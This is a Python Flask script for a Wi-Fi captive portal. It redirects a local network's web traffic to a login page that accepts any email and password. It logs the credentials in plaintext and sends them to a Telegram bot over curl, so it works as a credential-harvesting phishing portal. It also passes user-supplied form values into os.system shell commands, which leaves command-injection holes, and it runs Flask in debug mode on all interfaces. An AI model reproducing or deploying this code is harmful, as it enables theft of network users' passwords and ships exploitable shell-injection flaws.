#!/usr/bin/python
# -*- coding: utf-8 -*-

import subprocess
from flask import Flask, render_template, request, redirect, url_for, send_file, flash, session, abort
import time
import os

# These variables are used as settings
PORT        = 8080                # the port in which the captive portal web server listens 
IFACE       = "enp0s8"              # the interface that captive portal protects
IP_ADDRESS  = "192.168.25.1"       # the ip address of the captive portal (it can be the IP of IFACE)
NET_ADDRESS = "192.168.25.0/24"    # the network address
WAN     = "enp0s3"              # the WAN interface
#ssl_key_file = "/opt/captivePortal/v1/certificates/allouwifi.com.br.key"
#ssl_certificate_file = "/opt/captivePortal/v1/certificates/allouwifi.com.br.pem"

def sendAlert(message):
    bottoken = ""
    chatid = ""
    os.system("curl -s -X POST \
        -H 'Content-Type: application/json' \
        -d '{\"chat_id\": %s, \"text\": \"%s\", \"disable_notification\": true}' \
        https://api.telegram.org/bot%s/sendMessage >> /dev/null" % (chatid,message,bottoken))

def mac_GET(remote_IP):
    mac = subprocess.Popen("arp -a |grep -i "+remote_IP+" |awk -F' ' '{print($4)}'", stdout=subprocess.PIPE, shell=True)
    (mac_return, err) = mac.communicate()
    #print("\n\n MAC >>> "+mac_return)
    mac_return=str(mac_return.replace('\n',''))
    return mac_return

def writeLog(LOGIN):
    LOGFILE="/opt/captivePortal/v2/logs/access.log"
    date=time.strftime("%d-%m-%y %H:%M:%S")
    os.system("echo '%s - %s' >> %s" % (date,LOGIN,LOGFILE))

def allowUser(client_ip, email, password):
    controle = 1
    # USUARIOS COMUNS
    remote_IP = client_ip
    address_MAC = mac_GET(remote_IP)
    print('\n\n####################################################################################')
    #print("User.: %s, Pass: %s -> OK" % (check[0],check[1]))
    LOGIN = 'Nova autenticacao: Email='+ email+' Password='+ password +' remote_IP='+ remote_IP +''
    print(LOGIN)
    writeLog(LOGIN)
    MESSAGE = 'Nova autenticacao\nEmail: '+ email+'\nPassword: '+ password +'\nRemote_IP: '+ remote_IP +''
    sendAlert(MESSAGE)
    print('Updating IP tables')
    print('####################################################################################\n\n')
    subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
    subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
    
    valida = 1

    return True       
    

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('html_login.html')

@app.route('/do_login', methods=['POST'])
def do_POST():
    post_form = request.form
    email = post_form['email']
    password = post_form['password']
    client_ip = request.remote_addr

    print("\n\n >>> email:"+email+" |password: "+password+" \n\n")
    message = allowUser(client_ip, email, password)

    if message:
        return render_template('html_redirect_home.html')


@app.errorhandler(404)
def page_not_found(e):
    return render_template('html_login.html')

if __name__ == '__main__':
    subprocess.call(["clear"])
    print("*********************************************")
    print("* Note, if there are already iptables rules *")
    print("* this script may not work. Flush iptables  *")
    print("* at your own riks using iptables -F        *")
    print("*********************************************")
    print("[*] Cleaning the old rules...")
    subprocess.call(["iptables", "-F", "-t", "nat"])
    subprocess.call(["iptables", "-F"])
    time.sleep(2)   
    print("[*] Done!!\n")
    print("[*] Updating iptables")
    print("[*] Alterando politicas")
    subprocess.call(["iptables", "-P", "INPUT", "ACCEPT"])
    subprocess.call(["iptables", "-P", "FORWARD", "ACCEPT",])
    subprocess.call(["iptables", "-P", "OUTPUT", "ACCEPT"])
    print("[*] .. Allow ICMP")
    subprocess.call(["iptables", "-A", "FORWARD", "-s", NET_ADDRESS, "-p", "icmp", "-j" ,"ACCEPT"])
    print("[*] .. Allow TCP DNS")
    subprocess.call(["iptables", "-A", "FORWARD", "-s", NET_ADDRESS, "-p", "tcp", "--dport", "53", "-j" ,"ACCEPT"])
    print("[*] .. Allow UDP DNS")
    subprocess.call(["iptables", "-A", "FORWARD", "-s", NET_ADDRESS, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"])
    print("[*] .. Allow traffic to captive portal")
    subprocess.call(["iptables", "-A", "FORWARD", "-s", NET_ADDRESS, "-p", "tcp", "--dport", str(PORT),"-d", IP_ADDRESS, "-j" ,"ACCEPT"])
    print("[*] .. Block all other traffic")
    subprocess.call(["iptables", "-A", "FORWARD", "-s", NET_ADDRESS, "-j" ,"DROP"])
    print("[*] Enabled NAT")
    subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", WAN, "-j" ,"MASQUERADE"])
    print("[*] Enabled Routing")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    #subprocess.call(["/usr/bin/echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    #subprocess.call(["iptables", "-A", "FORWARD", "-s", NET_ADDRESS, "-p", "tcp", "-d", "128.30.52.100", "--dport", "80", "-j" ,"ACCEPT"])
    print("[*] Redirecting HTTP and HTTPS traffic to captive portal")
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-s", NET_ADDRESS, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", IP_ADDRESS+":"+str(PORT)])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-s", NET_ADDRESS, "-p", "tcp", "--dport", "443", "-j" ,"DNAT", "--to-destination", IP_ADDRESS+":"+str(PORT)])
    ### BYPASS CAPTIVE PORTAL
    os.system("/opt/captivePortal/v2/admin.sh")
    os.system("/opt/captivePortal/v2/auth_users.sh")
    ##
    print("[*] Starting web server")
    print("[*] Server Listening on %s:%s\n\n" % (IP_ADDRESS,PORT))
    app.run(debug = True,host="0.0.0.0",port=PORT,threaded=True)
